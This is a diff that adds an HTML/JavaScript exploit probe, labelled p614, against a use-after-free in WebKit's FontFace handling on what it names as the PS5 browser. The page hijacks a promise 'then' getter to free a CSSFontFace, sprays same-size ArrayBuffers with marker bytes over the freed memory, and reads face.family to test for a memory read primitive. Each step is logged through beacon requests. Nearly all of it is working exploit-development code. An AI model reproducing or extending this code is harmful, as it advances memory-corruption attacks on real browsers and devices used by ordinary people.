@@ -1,0 +1,155 @@
+<!--
+  p614: Test face.family after UAF — does backing() return null or raw pointer?
+
+  If PS5's WebKit 605.1.15 uses a raw CSSFontFace* instead of WeakPtr for
+  m_backing, the FontFace wrapper's family() getter would read m_family
+  directly from the reclaimed buffer (our spray data).
+
+  Test: after UAF + spray, read face.family from the promise success handler.
+  - If "normal" → WeakPtr, backing() is null (need forge path)
+  - If anything else → raw pointer, read primitive is trivial
+
+  Also tests: the faces array from load() resolution, what faces are available,
+  and whether any face object can reach the freed CSSFontFace.
+
+  CRASH_CLASS: HIGH (UAF trigger)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p614</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+
+function main(){
+b('P614-START');
+
+var pa = new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);
+void pa.loaded;
+
+// Store reference to sa's face if accessible
+var saRef = null;
+document.fonts.forEach(function(f){ if(f !== pa) saRef = f; });
+b('P614-SAREF='+(saRef ? 'found' : 'null'));
+
+// Read family BEFORE UAF for baseline
+if(saRef){
+  try{b('P614-PRE-SA-FAM='+saRef.family);}catch(e){b('P614-PRE-SA-FAM-ERR='+e);}
+}
+try{b('P614-PRE-PA-FAM='+pa.family);}catch(e){b('P614-PRE-PA-FAM-ERR='+e);}
+
+var fired = 0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(fired) return;
+  fired = 1;
+
+  // Capture which face triggered .then
+  var trigFace = this;
+  b('P614-TRAP-THIS='+(trigFace === pa ? 'pa' : (trigFace === saRef ? 'saRef' : 'unknown')));
+
+  document.getElementById('v').remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // Spray 192B with identifiable pattern at +0x30 (m_family region)
+  var lane = [];
+  for(var i=0;i<2048;i++){
+    var u = new Uint8Array(new ArrayBuffer(192));
+    wD(u, 0x00, 2);  // rc seed
+    // Write "P614" as ASCII at +0x30 (m_family position)
+    // CSSValueList* is at +0x30; we write a recognizable pattern
+    u[0x30] = 0x50; // P
+    u[0x31] = 0x36; // 6
+    u[0x32] = 0x31; // 1
+    u[0x33] = 0x34; // 4
+    u[0x34] = 0x54; // T
+    u[0x35] = 0x45; // E
+    u[0x36] = 0x53; // S
+    u[0x37] = 0x54; // T
+    // Also write pattern at +0x08..+0x50 for field identification
+    for(var off=0x08;off<0x50;off+=8){
+      wD(u, off, 0xDEAD0000 + off);
+      wD(u, off+4, 0x00000614);
+    }
+    u[0x82] = 3;
+    u[0x85] = 0xAA;
+    lane.push(u);
+  }
+  window._lane = lane;
+  return;
+},set:function(){}});
+
+// The success handler receives faces array AFTER the UAF
+document.fonts.load('1em pa, sa','AB').then(function(faces){
+  b('P614-RESOLVE-faces='+faces.length);
+
+  for(var i=0;i<faces.length;i++){
+    var f = faces[i];
+    var isPa = (f === pa);
+    var isSa = (saRef && f === saRef);
+    var tag = isPa ? 'pa' : (isSa ? 'saRef' : 'F'+i);
+
+    // Test family()
+    try{
+      var fam = f.family;
+      b('P614-FAM-'+tag+'='+String(fam).substring(0,100));
+    }catch(e){
+      b('P614-FAM-'+tag+'-ERR='+e.message);
+    }
+
+    // Test other getters
+    try{
+      b('P614-STYLE-'+tag+'='+String(f.style).substring(0,50));
+    }catch(e){
+      b('P614-STYLE-'+tag+'-ERR='+e.message);
+    }
+
+    try{
+      b('P614-STATUS-'+tag+'='+f.status);
+    }catch(e){
+      b('P614-STATUS-'+tag+'-ERR='+e.message);
+    }
+  }
+
+  // Also test saRef directly (not from faces array)
+  if(saRef){
+    try{
+      b('P614-SAREF-DIRECT-FAM='+String(saRef.family).substring(0,100));
+    }catch(e){
+      b('P614-SAREF-DIRECT-FAM-ERR='+e.message);
+    }
+  }
+
+  // Test pa directly
+  try{
+    b('P614-PA-DIRECT-FAM='+String(pa.family).substring(0,100));
+  }catch(e){
+    b('P614-PA-DIRECT-FAM-ERR='+e.message);
+  }
+
+  // Check if any spray buffer was hit
+  var lane = window._lane;
+  if(lane){
+    var hits = 0;
+    for(var i=0;i<lane.length;i++){
+      var v = lane[i], rc = rD(v,0);
+      if(rc !== 2){
+        hits++;
+        if(hits <= 3){
+          b('P614-SPRAY-HIT-b'+i+'-rc='+rc+'-T='+rQ(v,0x58)+'-W='+rQ(v,0x68)+'-may='+v[0x85]);
+        }
+      }
+    }
+    b('P614-SPRAY-HITS='+hits);
+  }
+
+  b('P614-DONE');
+},function(e){
+  b('P614-REJECT='+e);
+});
+}
+setTimeout(main, 300);
+</script></head><body>p614: family() after UAF</body></html>
